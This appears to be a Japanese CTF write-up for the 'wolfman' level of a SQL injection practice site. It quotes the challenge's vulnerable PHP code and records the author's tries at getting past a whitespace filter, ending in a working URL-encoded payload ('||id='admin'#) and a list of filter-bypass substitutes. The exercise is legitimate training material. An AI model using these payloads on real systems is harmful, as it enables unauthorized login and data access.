# wolfman

## answer

- [orc](../src/orc.py)

## problem

```
query : select id from prob_wolfman where id='guest' and pw=''

<?php 
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  if(preg_match('/ /i', $_GET[pw])) exit("No whitespace ~_~"); 
  $query = "select id from prob_wolfman where id='guest' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
  if($result['id'] == 'admin') solve("wolfman"); 
  highlight_file(__FILE__); 
?>
```

## memo

試しに、

```
https://los.eagle-jump.org/wolfman_f14e72f8d97e3cb7b8fe02bef1590757.php?pw=aaa
```

とすると

```
query : select id from prob_wolfman where id='guest' and pw='aaa'
```

となった。

コードを読んでいく。

```
if(preg_match('/ /i', $_GET[pw])) exit("No whitespace ~_~");
```

whitespaceフィルターだ。
半角スペースはタブ文字`\t`か`\**\`で回避するのがセオリーなのはたまたま知っていた（やったことない）ので、
さっそくためしてみる。

```
?pw='\tor\tid='admin'#
```

```
?pw='\**\or\**\id='admin'#  
```

上手くいかんな、、、

orの代わりに||を使ってみる作戦でいくか

```
?pw='||id='admin'#
```

行けない。

url encodeしてみる。

```
?pw='%7C%7Cid%3D'admin'%23
```

できた。

原因は`#`をurl encodeするかどうかだった。

## supplementary

いろんな文字がフィルターされたときの代替文字（CTF界伝説のサイト、[こちら](https://graneed.hatenablog.com/entry/2018/10/26/232304)を参照）

- ' : "
- = : STRCMPとis not TRUE
- admin : "admi" "n" を文字列結合

## references

- [preg_match | php manual](https://www.php.net/manual/ja/function.preg-match.php)

- [mysql_fetch_array | php manual](https://www.php.net/manual/ja/function.mysql-fetch-array.php)

- [mysql_query | php manual](https://www.php.net/manual/ja/function.mysql-query.php)

- [BSides Delhi CTF 2018 Write up | こんとろーるしーこんとろーるぶい](https://graneed.hatenablog.com/entry/2018/10/26/232304)

- [highlight_file | php manual](https://www.php.net/manual/ja/function.highlight-file.php)